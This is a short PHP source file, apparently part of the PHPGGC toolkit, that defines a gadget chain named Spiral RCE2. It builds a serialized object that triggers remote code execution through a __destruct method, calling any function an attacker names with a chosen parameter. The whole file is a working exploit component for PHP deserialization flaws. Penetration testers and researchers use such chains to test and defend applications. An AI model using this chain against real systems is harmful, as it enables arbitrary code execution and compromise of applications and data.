<?php

namespace GadgetChain\Spiral;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-2.8+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'execute the function and throw an error';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \App\App($function,$parameter);
    }
}